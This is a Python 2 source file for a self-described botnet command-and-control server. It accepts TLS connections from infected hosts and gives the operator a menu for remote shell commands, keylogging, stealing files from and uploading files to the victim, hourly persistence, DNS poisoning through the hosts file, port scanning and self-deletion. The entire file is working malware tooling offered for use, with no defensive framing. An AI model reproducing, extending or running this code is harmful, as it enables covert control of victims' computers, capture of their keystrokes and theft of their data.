import ssl
import socket
import os
import sys
import time
import threading
from queue import Queue
from Crypto.Cipher import AES
global all_connections
global all_address
NUMBER_OF_THREADS = 10
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []
print "Botnet C&C\n"
keyfiles = 'server.key'
certfiles = 'server.crt'
def main():
    global user_input,s
    while True:
        user_input = str(raw_input("C&C:> "))
        if 'version' in user_input:
            print "Version 0.1v"
        elif 'exit' in user_input:
            try:
                print "shutting down..."
                queue.task_done()
                #queue.task_done()
                break
            except Exception,e:
                print str(e)
                
        elif 'help' in user_input:
            help()
        elif 'connections' in user_input:
            connections()
        elif 'interact' in user_input:
            interact(user_input)
        else:
            print "command doesn't exist."


def connections():
    global all_address
    results = ''
    for n,conn in enumerate(all_connections):
        try:
            initiation(conn)
        except:
            del all_connections[n]
            del all_address[n]
            continue
        results += str(n) + '           ' + str(all_address[n][0]) + '           ' + whoami+"@"+hostname 
    print '--------------------Clients-------------------' + '\n' + results


def help():
    print ''' Commands:

    version - checks the version of C&C
    exit - exits the C&C
    interact - interact with a connection, e.g interact ID
    connections - print the current connections
    '''
def encrypt(message):
    encrypting = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return encrypting.encrypt(message)

def decrypt(message):
    decrypting = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return decrypting.decrypt(message)


def connect():
    global s,conn,addr,all_connections,all_address
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 8080))
    s.listen(5)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s_ssl = ssl.wrap_socket(s, keyfile=keyfiles, certfile=certfiles, server_side=True)
    print 'Listening For Incoming Connections...'
    global counter
    counter = os.urandom(16)
    global key
    key = os.urandom(32)    
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_address[:]
    while 1:
        try:
            conn,addr = s_ssl.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_address.append(addr)
            print "Got Connection From " ,addr[0]
	    conn.send(counter)
    	    time.sleep(2)
    	    conn.send(key)
        except socket.error as e:
            print "Error: {0}".format(e)

def initiation(i):
	global hostname,whoami
	hostname = encrypt("hostname")
	i.send(hostname)
	hostname = decrypt(i.recv(8192)).decode("utf-8")
	whoami = encrypt("whoami")
	i.send(whoami)
	whoami = decrypt(i.recv(8192)).decode("utf-8").strip('\n')


def interact(cmd):
    global all_address
    try:
        target = cmd.replace('interact ', '')
        target = int(target)
        connections = all_connections[target]
        print "Connected to " + str(all_address[target][0])
        while True:
            oldcommand = raw_input("Shell@%s:> " % all_address[target][0])
            command = encrypt(oldcommand)
            if oldcommand=='terminate':
                timer=raw_input("Time in seconds to reinitiate the connection: ")
                option1 = raw_input("Is the keylogger still running? (yes/no): ")
                if option1=="yes":
                    option2 = raw_input("Do you want to stop it? (yes/no): ")
                    if option2=="yes":
                        connections.send(encrypt('logstop'))
                        connections.send(encrypt('terminate'))
                        connections.send(encrypt(timer))
                        connections.close()
                        print "Connection Terminated."
                    elif option2=="no":
                        connections.send(encrypt('terminate'))
                        connections.send(encrypt(timer))
                        connections.close()
                        print "Connection Terminated."
                elif option1=="no":
                    connections.send(encrypt('terminate'))
                    connections.send(encrypt(timer))
                    connections.close()
                    print "Connection Terminated."
                else:
                    continue
            elif oldcommand=='back':
                main()
            elif 'help' in oldcommand:
                helppart,cmdpart=oldcommand.split(' ')
                if cmdpart=='terminate':
                    print "terminate"
                elif cmdpart=='back':
                    print "back"
                elif cmdpart=='assistance':
                    print "assistance"
                elif cmdpart=='panic':
                    print "panic"
                elif cmdpart=='logx':
                    print "logx"
                elif cmdpart=='logstop':
                    print "logstop"
                elif cmdpart=='download':
                    print "download*/pathofthefile/file"
                elif cmdpart=='upload':
                    print "upload*/fileyouwanttoupload/file"
                elif cmdpart=='dump':
                    print "dump"
                elif cmdpart=='poison':
                    print "poison"
                elif cmdpart=='delpoison':
                    print "delpoison"
                elif cmdpart=='scan':
                    print "scan IP fromwhichport untilwhichport"
                    print "e.g.: scan 192.168.0.1 1 1024"
            elif oldcommand=='panic':
                dontforget=str(raw_input("Did you delete persistence and DNS poison?(yes/no): "))
                if dontforget=='yes':
                    connections.send(command)
                    print "You are safe."
                elif dontforget=='no':
                    print "Delete them!"
                else:
                    continue
            elif oldcommand=='unpersist':
                connections.send(command)
                print "Entry Deleted but be sure to check it"
            elif oldcommand=='poison':
                poison = str(raw_input("Insert Your DNS Poison Line: "))
                connections.send(encrypt('poison'))
                connections.send(encrypt(poison))
                print "Poison Added."
            elif oldcommand=='delpoison':
                connections.send(encrypt('delpoison'))
                print "Last Poison deleted."
            elif oldcommand=='assistance':
                print '''Commands : 

        terminate - terminates the session
        back - goes back to main meny
        assistance - prints this menu
        panic - deletes the agent
        logx - initiates keylogging
        logstop - stops keylogging
        download - downloads a file from the victim
        upload - uploads a file to the victim
        poison - dns poisoning
        delpoison - deletes last line of /etc/hosts file
        scan - port scanner
        help - help command will show you the syntax of the command
                '''
            elif oldcommand=="logx":
                connections.send(encrypt('logx'))
                saved = str(raw_input("Save where: "))
                connections.send(encrypt(saved))
                resp = decrypt(connections.recv(8192)).decode("utf-8")
                if "Directory doesn't exist." in resp:
                    print resp
                else:
                    print resp 
            elif oldcommand=='logstop':
                connections.send(encrypt('logstop'))
                print "Keylogging Stopped."
            elif oldcommand=='persist':
                connections.send(command)
                print "Persistence Executed For Every Hour."
            elif 'scan' in oldcommand:
                if len(oldcommand.split(' '))<4:
                    print "Command Syntax is wrong."
                elif len(oldcommand.split(' '))==4:
                    idontcare,maybe,ii,do=oldcommand.split(' ')
                    ii=int(ii)
                    do=int(do)
                    connections.send(command)
                    print "Scanning..."
                    for supertrial in range(ii,do):
                        print decrypt(connections.recv(8192)).decode('utf-8')
                        break
            elif 'download' in oldcommand:
                downloadfile=str(raw_input("Save As: "))
                if len(downloadfile)==0:
                    print "Please Save It As Something."
                    continue
                else:
                    connections.send(command)
                    f = open(downloadfile,'wb')
                    while True:
                        bits = decrypt(connections.recv(8192))
                        if 'Unable to find out the file' in bits:
                            print 'File Not Found.'
                        elif bits=='DONE':
                            print 'Transfer Completed.'
                            f.close()
                            break
                        f.write(bits)
                    f.close()
            elif 'upload' in oldcommand:
                first,second=oldcommand.split('*')
                uploadfile=str(raw_input("Save As: "))
                if len(uploadfile)==0:
                    print "Please Save It As Something."
                    continue
                else:
                    connections.send(command)
                    connections.send(encrypt(uploadfile))
                    try:
                        if os.path.exists(second):
                            d = open(second,'rb')
                            packet = d.read(8192)
                            while packet != '':
                                connections.send(encrypt(packet))
                                packet = d.read(8192)
                                connections.send(encrypt('DONE'))
                                d.close()
                                print "Transfer Completed."
                        else:
                            connections.send(encrypt('Unable to find out the file'))
                    except Exception,e:
                        connections.send(str(encrypt(e)))
            else:
                connections.send(command)
                print decrypt(connections.recv(8192)).decode("utf-8")

    except Exception,e:
        print "Not a valid selection.", str(e)
        return None


def create_workers():
    global t
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    while True:
        j = queue.get()
        if j == 1:
            connect()
        if j == 2:
            time.sleep(1)
            main()
        #queue.join()
        queue.task_done()

def create_jobs():
    for h in JOB_NUMBER:
        queue.put(h)
    queue.join()


if __name__ == '__main__':
    create_workers()
    create_jobs()
